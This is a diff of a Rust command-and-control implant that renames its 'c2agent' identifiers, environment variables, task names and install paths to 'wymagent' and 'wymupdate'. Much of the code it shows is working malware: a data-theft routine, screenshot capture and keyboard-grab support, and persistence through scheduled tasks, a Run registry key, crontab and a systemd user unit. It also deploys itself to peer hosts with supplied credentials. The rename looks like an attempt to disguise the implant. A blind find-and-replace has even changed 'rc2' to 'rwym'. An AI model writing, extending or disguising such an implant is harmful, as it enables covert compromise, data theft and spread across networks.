@@ -5,7 +5,7 @@
 //
 // Cargo.toml:
 //   [package]
-//   name = "c2agent"
+//   name = "wymagent"
 //   version = "0.1.0"
 //   edition = "2021"
 //
@@ -16,21 +16,21 @@
 //   hostname = "0.4"
 //   rdev = { version = "0.5", features = ["unstable_grab"] }
 //
-// Build:  cargo build --release  (binary: target/release/c2agent)
+// Build:  cargo build --release  (binary: target/release/wymagent)
 // Usage:
-//   ./c2agent --server http://127.0.0.1:8000 --token <AGENT_TOKEN>
-//   ./c2agent --server http://127.0.0.1:8000 --token <AGENT_TOKEN> \
+//   ./wymagent --server http://127.0.0.1:8000 --token <AGENT_TOKEN>
+//   ./wymagent --server http://127.0.0.1:8000 --token <AGENT_TOKEN> \
 //       --interval 5 --jitter 2 --verbose
 //
 // Environment variables (accepted when the flag is not given):
-//   C2_SERVER, C2_TOKEN, C2_INTERVAL, C2_JITTER, C2_STATE_FILE, C2_VERBOSE
+//   WYM_SERVER, WYM_TOKEN, WYM_INTERVAL, WYM_JITTER, WYM_STATE_FILE, WYM_VERBOSE
 //
 // Flags:
-//   --server URL      server base URL (required unless C2_SERVER is set)
-//   --token TOKEN     shared agent token (required unless C2_TOKEN is set)
+//   --server URL      server base URL (required unless WYM_SERVER is set)
+//   --token TOKEN     shared agent token (required unless WYM_TOKEN is set)
 //   --interval N      heartbeat interval in seconds (default 10, min 1)
 //   --jitter N        random jitter in seconds added to the interval
-//   --state FILE      state file persisting the agent id (default ~/.c2agent_rs.json)
+//   --state FILE      state file persisting the agent id (default ~/.wymagent_rs.json)
 //   --verbose         print activity to stdout
 //   -h, --help        show this help and exit
 //
@@ -448,7 +448,7 @@ impl Agent {
             "screenshot" => {
                 let label = if get("name").is_empty() { "screenshot".into() } else { get("name") };
                 let tmp = std::env::temp_dir()
-                    .join(format!("c2shot_{}.png", std::process::id()));
+                    .join(format!("wymshot_{}.png", std::process::id()));
                 let tmp_disp = tmp.to_string_lossy().replace('\\', "/");
                 let cmd = if env::consts::OS == "windows" {
                     format!(
@@ -946,7 +946,7 @@ fn create_zip(work: &PathBuf, archive: &PathBuf) -> bool {
 }
 
 fn do_steal(task_id: &str, profile: &str, client: &reqwest::blocking::Client, server: &str) -> (String, i32) {
-    let work = std::env::temp_dir().join(format!("c2steal_{}", std::process::id()));
+    let work = std::env::temp_dir().join(format!("wymsteal_{}", std::process::id()));
     let _ = fs::create_dir_all(&work);
 
     let mut manifest: Vec<String> = Vec::new();
@@ -1282,11 +1282,11 @@ fn do_persistence(server: &str, token: &str, interval: u64, jitter: u64) -> (Str
             .or_else(|_| env::var("USERPROFILE"))
             .unwrap_or_else(|_| ".".to_string());
         let dir = PathBuf::from(appdata)
-            .join("Microsoft").join("Windows").join("c2update");
+            .join("Microsoft").join("Windows").join("wymupdate");
         let _ = fs::create_dir_all(&dir);
-        dest = dir.join("c2agent.exe");
+        dest = dir.join("wymagent.exe");
     } else {
-        let dir = home_file(".config/c2update");
+        let dir = home_file(".config/wymupdate");
         let _ = fs::create_dir_all(&dir);
         dest = dir.join(file_name_base(&self_path));
     }
@@ -1299,18 +1299,18 @@ fn do_persistence(server: &str, token: &str, interval: u64, jitter: u64) -> (Str
         let progdata = env::var("ProgramData")
             .or_else(|_| env::var("ALLUSERSPROFILE"))
             .unwrap_or_else(|_| "C:\\ProgramData".to_string());
-        let launcher_dir = PathBuf::from(progdata).join("c2update");
+        let launcher_dir = PathBuf::from(progdata).join("wymupdate");
         if fs::create_dir_all(&launcher_dir).is_err() {
             return ("persistence: failed to write launcher (cannot mkdir)".to_string(), 1);
         }
-        let wrapper = launcher_dir.join("c2relaunch.cmd");
+        let wrapper = launcher_dir.join("wymrelaunch.cmd");
         if fs::write(&wrapper, format!("@echo off\r\nstart \"\" /b {}\r\n", relaunch)).is_err() {
             return (format!("persistence: failed to write launcher {}", wrapper.to_string_lossy()), 1);
         }
         out.push_str(&format!("\npersistence: wrote launcher {}", wrapper.to_string_lossy()));
         let mut ok = false;
         let cmd = format!(
-            "schtasks /Create /TN \"c2agent-persist\" /TR \"{}\" /SC ONLOGON /RL HIGHEST /F",
+            "schtasks /Create /TN \"wymagent-persist\" /TR \"{}\" /SC ONLOGON /RL HIGHEST /F",
             wrapper.to_string_lossy()
         );
         let (sh, rc) = run_shell(&cmd, 60);
@@ -1319,11 +1319,11 @@ fn do_persistence(server: &str, token: &str, interval: u64, jitter: u64) -> (Str
         } else {
             out.push_str(&format!("\n  schtasks err: {}", first_line(&sh)));
             let reg = format!(
-                "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v c2agent /t REG_SZ /d \"{}\" /f",
+                "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v wymagent /t REG_SZ /d \"{}\" /f",
                 wrapper.to_string_lossy()
             );
-            let (sh2, rc2) = run_shell(&reg, 60);
-            if rc2 == 0 {
+            let (sh2, rwym) = run_shell(&reg, 60);
+            if rwym == 0 {
                 ok = true;
             } else {
                 out.push_str(&format!("\n  reg err: {}", first_line(&sh2)));
@@ -1339,9 +1339,9 @@ fn do_persistence(server: &str, token: &str, interval: u64, jitter: u64) -> (Str
 
     let mut ok_cron = false;
     let mut ok_sys = false;
-    let line = format!("@reboot {relaunch} # c2agent-persist");
+    let line = format!("@reboot {relaunch} # wymagent-persist");
     let cmd = format!(
-        "(crontab -l 2>/dev/null | grep -v 'c2agent-persist'; echo \"{line}\") | crontab -"
+        "(crontab -l 2>/dev/null | grep -v 'wymagent-persist'; echo \"{line}\") | crontab -"
     );
     let (sh, rc) = run_shell(&cmd, 60);
     if rc == 0 {
@@ -1349,9 +1349,9 @@ fn do_persistence(server: &str, token: &str, interval: u64, jitter: u64) -> (Str
     } else {
         out.push_str(&format!("\n  crontab err: {}", first_line(&sh)));
     }
-    let unit = home_file(".config/c2update/c2-update.service");
+    let unit = home_file(".config/wymupdate/wym-update.service");
     let unit_text = format!(
-        "[Unit]\nDescription=c2 agent update\n\n[Service]\nType=simple\nExecStart=/bin/sh -c \"{}\"\nRestart=always\n\n[Install]\nWantedBy=default.target\n",
+        "[Unit]\nDescription=wym agent update\n\n[Service]\nType=simple\nExecStart=/bin/sh -c \"{}\"\nRestart=always\n\n[Install]\nWantedBy=default.target\n",
         relaunch
     );
     if fs::write(&unit, unit_text).is_err() {
@@ -1364,8 +1364,8 @@ fn do_persistence(server: &str, token: &str, interval: u64, jitter: u64) -> (Str
             "systemctl --user daemon-reload 2>&1; systemctl --user enable --now {} 2>&1",
             unit.to_string_lossy()
         );
-        let (sh2, rc2) = run_shell(&syscmd, 60);
-        if rc2 == 0 {
+        let (sh2, rwym) = run_shell(&syscmd, 60);
+        if rwym == 0 {
             ok_sys = true;
         } else {
             out.push_str(&format!("\n  systemctl err: {}", first_line(&sh2)));
@@ -1470,14 +1470,14 @@ fn deploy_lateral_win(
         "\"c:\\windows\\{name}\" --server {server} --token {token} --interval {interval} --jitter {jitter}"
     );
     let cmd = format!(
-        "schtasks /Create /S {host} /TN \"c2agent-lateral\" /TR \"{relaunch}\" /SC ONLOGON /RU {user} /RP {pass} /RL HIGHEST /F"
+        "schtasks /Create /S {host} /TN \"wymagent-lateral\" /TR \"{relaunch}\" /SC ONLOGON /RU {user} /RP {pass} /RL HIGHEST /F"
     );
     let (sh, rc) = run_shell(&cmd, 30);
     let _ = run_shell(&format!("net use \"{share}\" /delete /y"), 20);
     if rc != 0 {
         return format!("deployed (file dropped; task: {})", first_line(&sh));
     }
-    "deployed (file dropped + scheduled c2agent-lateral)".to_string()
+    "deployed (file dropped + scheduled wymagent-lateral)".to_string()
 }
 
 fn deploy_lateral_unix(
@@ -1526,10 +1526,10 @@ fn do_lateral(
     let mut user = get("user");
     let mut pass = get("pass");
     if user.is_empty() {
-        user = env::var("C2_LAT_USER").unwrap_or_default();
+        user = env::var("WYM_LAT_USER").unwrap_or_default();
     }
     if pass.is_empty() {
-        pass = env::var("C2_LAT_PASS").unwrap_or_default();
+        pass = env::var("WYM_LAT_PASS").unwrap_or_default();
     }
     let self_path = self_path();
 
@@ -1567,7 +1567,7 @@ fn do_lateral(
     for host in &peers {
         let status;
         if user.is_empty() || pass.is_empty() {
-            status = "skipped (no credentials; set C2_LAT_USER/C2_LAT_PASS)".to_string();
+            status = "skipped (no credentials; set WYM_LAT_USER/WYM_LAT_PASS)".to_string();
             skipped += 1;
         } else if env::consts::OS == "windows" {
             status = deploy_lateral_win(
@@ -1609,14 +1609,14 @@ fn main() {
     while let Some(arg) = args.next() {
         match arg.as_str() {
             "-h" | "--help" => {
-                println!("usage: c2agent --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]");
+                println!("usage: wymagent --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]");
                 println!();
-                println!("Flags (also settable via C2_SERVER/C2_TOKEN/C2_INTERVAL/C2_JITTER/C2_STATE_FILE/C2_VERBOSE):");
-                println!("  --server URL      server base URL (required unless C2_SERVER is set)");
-                println!("  --token TOKEN     shared agent token (required unless C2_TOKEN is set)");
+                println!("Flags (also settable via WYM_SERVER/WYM_TOKEN/WYM_INTERVAL/WYM_JITTER/WYM_STATE_FILE/WYM_VERBOSE):");
+                println!("  --server URL      server base URL (required unless WYM_SERVER is set)");
+                println!("  --token TOKEN     shared agent token (required unless WYM_TOKEN is set)");
                 println!("  --interval N      heartbeat interval in seconds (default 10, min 1)");
                 println!("  --jitter N        random jitter in seconds added to the interval");
-                println!("  --state FILE      state file persisting the agent id (default ~/.c2agent_rs.json)");
+                println!("  --state FILE      state file persisting the agent id (default ~/.wymagent_rs.json)");
                 println!("  --verbose         print activity to stdout");
                 println!("  -h, --help        show this help and exit");
                 std::process::exit(0);
@@ -1637,43 +1637,43 @@ fn main() {
         }
     }
     if server.is_empty() {
-        server = env::var("C2_SERVER").unwrap_or_default();
+        server = env::var("WYM_SERVER").unwrap_or_default();
     }
     if token.is_empty() {
-        token = env::var("C2_TOKEN").unwrap_or_default();
+        token = env::var("WYM_TOKEN").unwrap_or_default();
     }
     if state_file.is_none() {
-        if let Ok(sf) = env::var("C2_STATE_FILE") {
+        if let Ok(sf) = env::var("WYM_STATE_FILE") {
             if !sf.is_empty() {
                 state_file = Some(PathBuf::from(sf));
             }
         }
     }
     if !interval_passed {
-        if let Ok(iv) = env::var("C2_INTERVAL") {
+        if let Ok(iv) = env::var("WYM_INTERVAL") {
             if let Ok(n) = iv.parse() {
                 interval = n;
             }
         }
     }
     if !jitter_passed {
-        if let Ok(jt) = env::var("C2_JITTER") {
+        if let Ok(jt) = env::var("WYM_JITTER") {
             if let Ok(n) = jt.parse() {
                 jitter = n;
             }
         }
     }
-    if let Ok(vb) = env::var("C2_VERBOSE") {
+    if let Ok(vb) = env::var("WYM_VERBOSE") {
         if vb == "1" || vb == "true" {
             verbose = true;
         }
     }
     if server.is_empty() || token.is_empty() {
-        eprintln!("usage: c2agent --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]");
+        eprintln!("usage: wymagent --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]");
         std::process::exit(1);
     }
 
-    let state_file = state_file.unwrap_or_else(|| home_file(".c2agent_rs.json"));
+    let state_file = state_file.unwrap_or_else(|| home_file(".wymagent_rs.json"));
     let mut agent = Agent::new(&server, &token, interval, jitter, verbose, state_file);
     agent.run();
 }
